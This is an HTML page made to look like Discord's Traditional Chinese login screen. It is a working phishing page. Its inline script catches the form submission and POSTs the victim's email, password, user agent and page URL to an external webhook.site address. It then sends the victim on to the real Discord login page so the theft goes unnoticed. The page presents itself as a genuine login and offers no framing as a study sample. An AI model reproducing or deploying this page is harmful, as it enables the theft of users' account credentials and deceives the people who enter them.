<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <title>Discord - 登入</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { margin:0; background:#36393f; font-family:'gg sans',sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; color:#dcddde; }
    .container { width:440px; background:#36393f; padding:40px; border-radius:5px; box-shadow:0 2px 10px rgba(0,0,0,.4); }
    .logo { text-align:center; margin-bottom:30px; }
    .logo img { width:80px; }
    h1 { font-size:24px; text-align:center; margin:0 0 8px; color:#fff; }
    .sub { text-align:center; color:#b9bbbe; margin-bottom:30px; }
    label { display:block; margin-bottom:8px; color:#b9bbbe; font-weight:600; font-size:14px; }
    input { width:100%; padding:10px; margin-bottom:20px; background:#202225; border:1px solid #202225; border-radius:3px; color:#fff; font-size:16px; box-sizing:border-box; }
    input:focus { border-color:#5865f2; outline:none; box-shadow:0 0 0 2px rgba(88,101,242,.3); }
    button { width:100%; padding:12px; background:#5865f2; color:#fff; border:none; border-radius:3px; font-size:16px; cursor:pointer; }
    button:hover { background:#4752c4; }
    .footer { text-align:center; margin-top:20px; font-size:12px; color:#72767d; }
    .footer a { color:#00aff4; text-decoration:none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
    </div>
    <h1>歡迎回來！</h1>
    <div class="sub">很高興再次見到你</div>
    
    <form id="f">
      <label>電子郵件或電話號碼</label>
      <input id="email" required>
      <label>密碼</label>
      <input id="password" type="password" required>
      <button type="submit">登入</button>
    </form>
    
    <div class="footer">
      <a href="#">忘記密碼？</a><br>
      需要帳號？<a href="#">註冊</a>
    </div>
  </div>

  <script>
    document.getElementById('f').onsubmit = e => {
      e.preventDefault();
      fetch('https://webhook.site/7a08f4e8-a861-4eb9-9104-5412abf52d94', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
          email: document.getElementById('email').value,
          password: document.getElementById('password').value,
          time: Date.now(),
          ua: navigator.userAgent,
          url: location.href
        })
      });
      alert('登入中...');
      setTimeout(() => location = 'https://discord.com/login', 1000);
    };
  </script>
</body>
</html>
